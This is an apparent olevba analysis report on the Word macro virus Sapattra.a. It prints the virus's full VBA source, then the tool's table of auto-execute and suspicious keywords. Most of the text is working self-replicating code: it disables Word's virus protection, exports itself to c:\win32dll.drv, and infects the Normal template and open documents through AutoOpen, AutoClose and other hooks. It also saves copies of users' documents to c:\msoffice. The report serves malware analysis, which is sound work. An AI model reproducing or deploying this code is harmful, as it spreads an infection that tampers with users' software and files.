olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sapattra.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sapattra.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sapattra.bas 
in file: Virus.MSWord.Sapattra.a - OLE stream: 'Macros/VBA/Sapattra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub checkDIR()
    Dim MyFile, MyPath, MyName
       MyPath = "c:\msoffice"
    MyName = Dir(MyPath, vbDirectory)
    If MyName = "" Then
      MkDir "c:\msoffice"
    End If
    
End Sub

Sub doSAVE()
    Dim no_of_docs, file1
    Dim myDate, myTime
    
    no_of_docs = application.Documents.Count
    
    If no_of_docs < 1 Then Exit Sub
    
    myDate = Date
    myTime = Time
    
    s1 = Trim(Format(myDate, "dd-mmm-yyyy"))
    s2 = Trim(Format(myTime, "hh-mm-ss AMPM"))
    
    file1 = s1 + "(" + s2 + ")"
    
    checkDIR
    
    path1 = "c:\msoffice\" + file1 + ".doc"
  
  
    ActiveDocument.SaveAs FileName:=path1, FileFormat:=wdFormatDocument, _
        LockComments:=False, AddToRecentFiles:=True, WritePassword _
        :="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
        SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False
    
  

    
     
End Sub


Function checkSIGN(location As Boolean)
    Dim mfile, ccount, index
    Dim signflag As Boolean
    Dim sigunature As String
     
      
    mfile = "c:\win32dll.drv"
    'On Error GoTo error_lable
    
    signature = "Sapattra"
    signflag = False
    index = 0
    
    
    If application.Documents.Count < 1 Then
      checkSIGN = index
      Exit Function
    End If
    
    If (location) Then
        ccount = Word.ActiveDocument.VBProject.VBComponents.Count
        For i% = 1 To ccount
           mm$ = Word.ActiveDocument.VBProject.VBComponents.Item(i%).Name
           If Trim(mm$) = signature Then
              signflag = True
              index = i%
              Word.ActiveDocument.VBProject.VBComponents.Item(index).Export mfile
           End If
        Next i%
    Else
        ccount = Word.NormalTemplate.VBProject.VBComponents.Count
        For i% = 1 To ccount
           mm$ = Word.NormalTemplate.VBProject.VBComponents.Item(i%).Name
           If Trim(mm$) = signature Then
              signflag = True
              index = i%
              Word.NormalTemplate.VBProject.VBComponents.Item(index).Export mfile
           End If
        Next i%
    End If

  checkSIGN = index
  
err_lbl:
End Function


Sub doAttach()
    Dim ld, ln
    Dim mfile
    
    
    On Error GoTo exit_label_2
    
    Word.Options.VirusProtection = False
    ld = checkSIGN(True)
    ln = checkSIGN(False)
    mfile = "c:\win32dll.drv"
    
    If (ln And ld) Then
      'module is attached hence exit
      GoTo exit_label_2
    End If
    
    If (ld = 0) Then
     'module is not attached to active document the attach to it
      Word.ActiveDocument.VBProject.VBComponents.Import mfile
    End If
    
    If (ln = 0) Then
     'module is not attached to active document the attach to it
     Word.NormalTemplate.VBProject.VBComponents.Import mfile
    End If
    
    

exit_label_2:
End Sub

Sub AutoExec()
 doAttach
End Sub

Sub AutoNew()
 doAttach
End Sub

Sub AutoClose()
 doAttach
 doSAVE
End Sub

Sub AutoExit()
 doAttach
 doSAVE
End Sub

Sub AutoOpen()
doAttach
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

